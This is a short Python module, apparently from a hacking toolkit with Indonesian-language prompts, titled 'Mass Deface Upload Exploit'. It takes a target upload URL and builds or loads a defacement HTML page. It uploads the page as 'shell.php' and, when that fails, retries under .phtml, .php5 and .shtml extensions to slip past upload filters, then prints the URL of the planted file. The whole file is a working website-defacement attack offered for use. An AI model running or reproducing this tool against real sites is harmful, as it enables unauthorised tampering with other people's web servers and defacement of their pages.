DESCRIPTION = "Mass Deface Upload Exploit"
def run():
    import requests
    
    target_url = input("URL upload target: ")
    
    print("[1] Buat file deface baru")
    print("[2] Pakai file deface yang sudah ada")
    choice = input("Pilih: ")
    
    if choice == "1":
        title = input("Judul deface: ")
        message = input("Pesan deface: ")
        html = f"""<html><head><title>{title}</title>
<style>body{{background:black;color:red;text-align:center;margin-top:20%}}
h1{{font-size:60px}}</style></head>
<body><h1>{title}</h1><p>{message}</p></body></html>"""
        with open("deface.html", "w") as f:
            f.write(html)
        file_path = "deface.html"
    else:
        file_path = input("Path file HTML: ")
    
    # Upload dengan ekstensi PHP
    with open(file_path, "r") as f:
        content = f.read()
    
    files = {"file": ("shell.php", content, "application/x-php")}
    
    try:
        r = requests.post(target_url, files=files, timeout=10)
        print(f"[*] Status: {r.status_code}")
        if r.status_code == 200:
            base_url = target_url.rsplit("/", 1)[0]
            print(f"[+] SUKSES! Akses: {base_url}/shell.php")
        else:
            print("[-] Coba dengan ekstensi lain...")
            # Coba ekstensi .phtml, .php5, .shtml
            for ext in ["phtml", "php5", "shtml"]:
                files = {"file": (f"shell.{ext}", content, f"application/x-{ext}")}
                r = requests.post(target_url, files=files, timeout=10)
                if r.status_code == 200:
                    print(f"[+] Berhasil dengan .{ext}")
                    break
    except Exception as e:
        print(f"[!] Error: {e}")
